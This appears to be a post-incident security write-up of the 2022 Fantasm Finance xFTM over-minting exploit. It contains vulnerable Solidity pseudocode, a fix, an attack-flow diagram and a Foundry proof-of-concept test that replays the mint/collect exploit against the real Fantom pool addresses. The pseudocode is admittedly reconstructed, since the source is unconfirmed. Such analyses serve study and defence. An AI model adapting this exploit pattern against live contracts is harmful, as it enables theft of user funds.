# Fantasm Finance — xFTM Over-Minting via Decimal Precision Error Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-09 |
| **Protocol** | Fantasm Finance |
| **Chain** | Fantom |
| **Loss** | ~$2,600,000 (xFTM) |
| **Attacker** | [0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400](https://ftmscan.com/address/0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400) |
| **Vulnerable Contract** | Pool [0x880672AB1d46D987E5d663Fc7476CD8df3C9f937](https://ftmscan.com/address/0x880672AB1d46D987E5d663Fc7476CD8df3C9f937) |
| **Root Cause** | A decimal scaling error in the xFTM output calculation of the `mint()` function caused far more xFTM to be minted than intended per 1 FSM input |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Fantasm_exp.sol) |

---
## 1. Vulnerability Overview

Fantasm Finance's Pool contract provided a `mint()` function that minted xFTM tokens in exchange for deposited FSM tokens. The xFTM output amount (`_xftmOut`) calculation logic contained a decimal scale mismatch.

Due to a difference in decimal places (decimals) between FSM and xFTM, or an incorrectly applied scaling factor during intermediate calculations, it was possible to mint a large amount of xFTM with a small FSM input. The attacker exploited this by calling `mint()` followed by `collect()` to receive the xFTM and realize a profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Pool.mint() (pseudocode)
contract Pool {
    IERC20 FSM;   // 18 decimals
    IERC20 xFTM;  // 18 decimals

    function mint(uint256 fsmAmount, uint256 minXftm) external {
        require(fsmAmount > 0, "Zero amount");
        FSM.transferFrom(msg.sender, address(this), fsmAmount);

        // ❌ Decimal error: scaling calculation bug
        // Intended: fsmAmount(18 decimals) → xftmOut(18 decimals) 1:1 conversion
        // Actual: additional scaling factor causes xftmOut to be 1e18x larger
        uint256 _xftmOut = (fsmAmount * priceRatio) / PRICE_PRECISION;
        // ❌ PRICE_PRECISION is too small, or priceRatio is already scaled
        // _xftmOut = fsmAmount * 1e18 / 1 = fsmAmount * 1e18 (excessively large)

        pendingRewards[msg.sender] += _xftmOut;
        emit Mint(msg.sender, fsmAmount, _xftmOut);
    }

    function collect() external {
        uint256 amount = pendingRewards[msg.sender];
        require(amount > 0, "Nothing to collect");
        pendingRewards[msg.sender] = 0;
        xFTM.transfer(msg.sender, amount);
    }
}

// ✅ Correct pattern
function mint(uint256 fsmAmount, uint256 minXftm) external {
    require(fsmAmount > 0, "Zero amount");
    FSM.transferFrom(msg.sender, address(this), fsmAmount);

    // ✅ Clear scale definition: both tokens have 18 decimals
    // Unified with PRICE_PRECISION = 1e18
    uint256 _xftmOut = (fsmAmount * priceRatio) / 1e18;
    require(_xftmOut >= minXftm, "Slippage");

    pendingRewards[msg.sender] += _xftmOut;
}
```


### On-Chain Original Code

Source: Source unconfirmed

> ⚠️ No on-chain source code — only bytecode exists or source is unverified

**Vulnerable function** — `mint()`:
```solidity
// ❌ Root cause: decimal scaling error in the xFTM output calculation of mint() causes far more xFTM to be minted than intended per 1 FSM input
// Source code unconfirmed — bytecode analysis required
// Vulnerability: decimal scaling error in the xFTM output calculation of mint() causes far more xFTM to be minted than intended per 1 FSM input
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0x9362e8...)
    │
    ├─[1] Acquire 100 ether (100 × 10^18) of FSM tokens
    │       FSM.transfer(attacker, 100e18)
    │
    ├─[2] Approve Pool to spend FSM
    │       FSM.approve(Pool, 100e18)
    │
    ├─[3] Call Pool.mint(100e18, 1)
    │       ⚡ Decimal error triggered
    │       _xftmOut = 100e18 * priceRatio / WRONG_PRECISION
    │                = 100e18 * 1e18 / 1
    │                = 100e36 xFTM (massive over-mint)
    │       pendingRewards[attacker] += 100e36
    │
    ├─[4] vm.roll(block + 1): advance one block
    │
    ├─[5] Call Pool.collect()
    │       Receive 100e36 xFTM
    │
    └─[6] Sell xFTM → realize profit in FTM/USDC
            Loss: ~$2,600,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IPool {
    // ⚡ Vulnerable function: decimal error causes xFTM over-minting
    function mint(uint256 fsmAmount, uint256 minXftm) external;
    function collect() external;
}

contract ContractTest is Test {
    IERC20 FSM  = IERC20(0xaa621D2002b5a6275EF62d7a065A865167914801);
    IERC20 xFTM = IERC20(0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F);
    IPool pool  = IPool(0x880672AB1d46D987E5d663Fc7476CD8df3C9f937);
    address attacker = 0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400;

    function setUp() public {
        vm.createSelectFork("fantom", 32_971_742);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        uint256 mintAmount = 100_000_000_000_000_000_000; // 100 FSM

        // [Step 1] Transfer FSM to the attacker contract
        FSM.transfer(address(this), mintAmount);
        vm.stopPrank();

        // [Step 2] Approve Pool
        FSM.approve(address(pool), mintAmount);

        emit log_named_decimal_uint("[Before] xFTM balance", xFTM.balanceOf(address(this)), 18);

        // [Step 3] Call mint — decimal error queues massive xFTM
        pool.mint(mintAmount, 1);

        // [Step 4] Advance one block, then collect
        vm.roll(block.number + 1);
        pool.collect();

        emit log_named_decimal_uint("[After] xFTM balance", xFTM.balanceOf(address(this)), 18);
        emit log_named_string("Exploit", "Decimal error caused massive xFTM minting");
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arithmetic Error / Decimal Scale Mismatch |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | Token decimal handling error |
| **Attack Vector** | Exploiting priceRatio calculation error via mint() call |
| **Precondition** | Pool contract with decimal scaling bug |
| **Impact** | Unlimited xFTM minting possible |

---
## 6. Remediation Recommendations

1. **Unified decimal standard**: Use a consistent PRECISION (e.g., 1e18) for all price/ratio calculations.
2. **Write unit tests**: Write tests that verify correct output amounts at boundary values (1 wei, 1e18, max value).
3. **Set output caps**: Limit the maximum xFTM amount that can be minted in a single mint transaction.
4. **Static analysis tools**: Leverage Slither's `incorrect-equality` and `divide-before-multiply` detectors.

---
## 7. Lessons Learned

- **The severity of decimal errors**: In DeFi, a single decimal error can lead to millions of dollars in losses.
- **Scaling consistency**: Functions handling multiple tokens must explicitly account for each token's decimals.
- **$2.6M loss**: Although it was a small protocol in the early Fantom ecosystem, the same bug can occur in a protocol of any size.
- **Code review**: Arithmetic calculation sections should be reviewed jointly with specialized mathematical/economic auditors.